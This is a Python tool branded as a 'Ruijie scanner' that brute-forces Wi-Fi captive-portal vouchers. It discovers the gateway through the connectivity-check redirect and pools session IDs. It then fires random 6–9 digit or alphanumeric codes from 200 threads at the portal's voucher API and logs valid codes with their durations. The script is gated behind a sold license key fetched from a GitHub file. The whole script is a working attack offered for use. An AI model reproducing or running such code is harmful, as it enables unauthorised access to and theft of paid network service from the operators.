import requests, random, string, time, os, threading, re, sys, urllib3, subprocess
from queue import Queue, Empty
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime
from colorama import Fore, Back, Style, init

# Colorama initialize
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- [ COLORS ] ---
G = Fore.GREEN; W = Fore.WHITE; Y = Fore.YELLOW; R = Fore.RED; C = Fore.CYAN; RS = Style.RESET_ALL

# ===============================
# CONFIGURATION
# ===============================
RAW_KEY_URL = "Https://raw.githubusercontent.com/kokoarkar446-cloud/voucher/refs/heads/main/keys.txt"
if os.name == 'nt': DOWNLOAD_DIR = os.path.join(os.environ['USERPROFILE'], 'Downloads')
else: DOWNLOAD_DIR = '/sdcard/Download'

LICENSE_FILE = os.path.join(DOWNLOAD_DIR, 'license.txt')
SAVE_PATH = os.path.join(DOWNLOAD_DIR, 'hits.txt')
STATS_FILE = os.path.join(DOWNLOAD_DIR, 'total_stats.txt')

NUM_THREADS = 200             
SESSION_POOL_SIZE = 50        
PER_SESSION_MAX = 300         
CODE_LENGTH = 6 
CHAR_SET = string.digits 

# ==============================
# GLOBALS (NEW)
# ==============================
USER_NAME = "Unknown"
EXPIRY_STR = "N/A"
DAYS_LEFT = "0"

# ==============================
# GLOBALS (YOURS)
# ==============================
session_pool = Queue()
valid_hits_data = [] 
tried_codes = set()
valid_lock = threading.Lock()
file_lock = threading.Lock()
DETECTED_BASE_URL = None
TOTAL_HITS = 0
TOTAL_TRIED = 0
CURRENT_CODE = ""
START_TIME = time.time()
stop_event = threading.Event()

# Load stats
try:
    if os.path.exists(STATS_FILE):
        with open(STATS_FILE, "r") as f: TOTAL_TRIED = int(f.read().strip())
except: TOTAL_TRIED = 0

# ===============================
# UI & UTILITY FUNCTIONS
# ===============================
def get_hwid():
    try: return f"ID-{subprocess.check_output(['whoami']).decode().strip()}"
    except: return "ID-UNKNOWN"

def Draw_logo():
    os.system('clear')
    print(f"""{G}
      .---.        .-----------.
     /     \  __  /    v9.0     \\
    / /     \(  )/   HYBRID      \\
   //////   ' \/ `   RUIJIE       \\
  //////    /    \   SCANNER      /
 //////    /      \              /
'------'  '--------'------------'
{W} OWNER : {C}{USER_NAME} {W}| EXP : {Y}{EXPIRY_STR} ({DAYS_LEFT} Days Left){RS}""")

# --- [ NEW VERIFY SYSTEM ] ---
def verify():
    global USER_NAME, EXPIRY_STR, DAYS_LEFT
    hwid = get_hwid()
    now = datetime.now().date()

    # 1. Offline Check
    if os.path.exists(LICENSE_FILE):
        try:
            with open(LICENSE_FILE, "r") as f:
                saved = f.read().strip().split(":")
            if len(saved) >= 3:
                USER_NAME, EXPIRY_STR = saved[1], saved[2]
                exp_date = datetime.strptime(EXPIRY_STR, '%Y-%m-%d').date()
                diff = (exp_date - now).days
                if diff >= 0:
                    DAYS_LEFT = str(diff)
                    Draw_logo()
                    print(f"{G}[✓] Offline Login Success!{RS}")
                    time.sleep(1.5)
                    return True
                else: os.remove(LICENSE_FILE)
        except: pass

    # 2. Online Check
    Draw_logo()
    try:
        print(f"{W}[*] Connecting to License Server...{RS}")
        resp = requests.get(f"{RAW_KEY_URL}?t={random.random()}", timeout=15).text
        print(f"{W}[+] YOUR DEVICE ID: {Y}{hwid}{RS}")
        key = input(f"{Y}[?] ENTER LICENSE KEY: {RS}").strip()

        for line in resp.splitlines():
            if ":" in line and f"{key}:{hwid}" in line:
                p = line.split(":")
                if len(p) >= 4:
                    USER_NAME, EXPIRY_STR = p[2], p[3]
                    exp_date = datetime.strptime(EXPIRY_STR, '%Y-%m-%d').date()
                    diff = (exp_date - now).days
                    if diff >= 0:
                        DAYS_LEFT = str(diff)
                        with open(LICENSE_FILE, "w") as f:
                            f.write(f"{key}:{USER_NAME}:{EXPIRY_STR}")
                        Draw_logo()
                        print(f"{G}[✓] Access Granted!{RS}")
                        time.sleep(2)
                        return True
        print(f"{R}[!] Invalid Key or ID Not Registered.{RS}")
        return False
    except Exception as e:
        print(f"{R}[!] Server Error: {e}{RS}")
        return False

def save_progress():
    try:
        os.makedirs(os.path.dirname(STATS_FILE), exist_ok=True)
        with file_lock:
            with open(STATS_FILE, "w") as f: f.write(str(TOTAL_TRIED))
    except: pass

def select_mode():
    global CODE_LENGTH, CHAR_SET
    Draw_logo()
    print(f"\n{C}[ SELECT SCAN MODE ]{RS}")
    print(f" {Y}[1]{W} Scan 6-Digit (000000 format)")
    print(f" {Y}[2]{W} Scan 7-Digit")
    print(f" {Y}[3]{W} Scan 8-Digit")
    print(f" {Y}[4]{W} Scan 9-Digit")
    print(f" {Y}[5]{W} Alphanumeric Mode")
    
    choice = input(f"\n{C}Choose (1-5): {RS}")
    if choice == "2": CODE_LENGTH = 7
    elif choice == "3": CODE_LENGTH = 8
    elif choice == "4": CODE_LENGTH = 9
    elif choice == "5":
        CODE_LENGTH = 6
        CHAR_SET = string.ascii_lowercase + string.digits 
    else: CODE_LENGTH = 6
    print(f"{G}[!] Mode Activated. Starting Turbo Engine...{RS}")
    time.sleep(1)

def get_sid_from_gateway():
    global DETECTED_BASE_URL
    s = requests.Session()
    try:
        r1 = s.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
        path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
        final_url = urljoin(r1.url, path_match.group(1)) if path_match else r1.url
        if path_match:
            r2 = s.get(final_url, timeout=5)
            final_url = r2.url
        parsed = urlparse(final_url)
        DETECTED_BASE_URL = f"{parsed.scheme}://{parsed.netloc}"
        sid = parse_qs(parsed.query).get('sessionId', [None])[0]
        return sid
    except: return None

def session_refiller():
    while not stop_event.is_set():
        try:
            if session_pool.qsize() < SESSION_POOL_SIZE:
                sid = get_sid_from_gateway()
                if sid: session_pool.put({'sessionId': sid, 'left': PER_SESSION_MAX})
            time.sleep(0.5)
        except: time.sleep(2)

def worker_thread():
    global TOTAL_TRIED, TOTAL_HITS, CURRENT_CODE
    thr_session = requests.Session()
    headers = {'Content-Type': 'application/json', 'Connection': 'keep-alive'}
    while not stop_event.is_set():
        try:
            if not DETECTED_BASE_URL:
                time.sleep(1); continue
            try: slot = session_pool.get(timeout=2)
            except Empty: continue
            sid = slot.get('sessionId')
            
            code = ''.join(random.choices(CHAR_SET, k=CODE_LENGTH))
            if code in tried_codes: continue
            tried_codes.add(code)
            CURRENT_CODE = code
            
            r = thr_session.post(f"{DETECTED_BASE_URL}/api/auth/voucher/", 
                                 json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, 
                                 headers=headers, timeout=6)
            TOTAL_TRIED += 1
            if TOTAL_TRIED % 100 == 0: save_progress()
            
            res_text = r.text.lower()
            if "true" in res_text:
                limit_label = "???"
                try:
                    res_data = r.json()
                    limit = res_data.get('limit') or res_data.get('timeLimit')
                    if not limit and 'data' in res_data:
                        d = res_data['data']
                        limit = d[0].get('timeLimit') if isinstance(d, list) else d.get('timeLimit')
                    
                    if limit:
                        sec = int(limit)
                        if sec == 2592000: limit_label = "1 Month"
                        elif sec == 86400: limit_label = "1 Day"
                        else: limit_label = f"{round(sec/3600, 1)} Hrs"
                except: pass

                with valid_lock:
                    valid_hits_data.append({"code": code, "hrs": limit_label})
                    TOTAL_HITS += 1
                    save_locally(code, limit_label, sid)
            
            if r.status_code not in (401, 403):
                slot['left'] -= 1
                if slot['left'] > 0: session_pool.put(slot)
        except: pass

def save_locally(code, hrs, sid):
    try:
        os.makedirs(os.path.dirname(SAVE_PATH), exist_ok=True)
        with file_lock:
            with open(SAVE_PATH, "a") as f: 
                f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {code} | {hrs} | SID: {sid}\n")
    except: pass

def live_dashboard():
    while not stop_event.is_set():
        Draw_logo()
        elapsed = time.time() - START_TIME
        speed = (TOTAL_TRIED / elapsed) if elapsed > 0 else 0
        now_time = datetime.now().strftime("%H:%M:%S")

        print(W + "—" * 55)
        print(f"| {W}STATUS : {G}ACTIVE         {W}SPEED  : {C}{speed:.1f} codes/s")
        print(f"| {W}TIME   : {Y}{now_time}       {W}RUN    : {Fore.MAGENTA}{time.strftime('%H:%M:%S', time.gmtime(elapsed))}")
        print(W + "—" * 55)
        print(f"| {W}TOTAL TRIED : {W}{TOTAL_TRIED:,}")
        print(f"| {W}FOUND HITS  : {G}{TOTAL_HITS}")
        print(f"| {W}LAST TARGET : {Y}{CURRENT_CODE}")
        print(W + "—" * 55)
        
        if valid_hits_data:
            print(f"{G}[ RECENT HITS FOUND ]:")
            for hit in valid_hits_data[-8:]:
                color = R if "Month" in hit['hrs'] else G
                print(f"  {color}✅ {hit['code']} {Y}({hit['hrs']})")
        else:
            print(f"{R}Scanning for vouchers...")

        print(W + "—" * 55)
        print(f"{Y}Saved to: {W}Downloads/hits.txt")
        time.sleep(1.0)

# ===============================
# MAIN ENTRY
# ===============================
if __name__ == "__main__":
    if verify(): # Key System စစ်မယ်
        select_mode()
        try:
            threading.Thread(target=session_refiller, daemon=True).start()
            threading.Thread(target=live_dashboard, daemon=True).start()
            for _ in range(NUM_THREADS):
                threading.Thread(target=worker_thread, daemon=True).start()
            while True: time.sleep(1)
        except KeyboardInterrupt:
            stop_event.set()
            save_progress()
            print(f"\n\n{R}[!] Stopped. Data saved in Downloads/hits.txt{RS}")
    else:
        sys.exit()
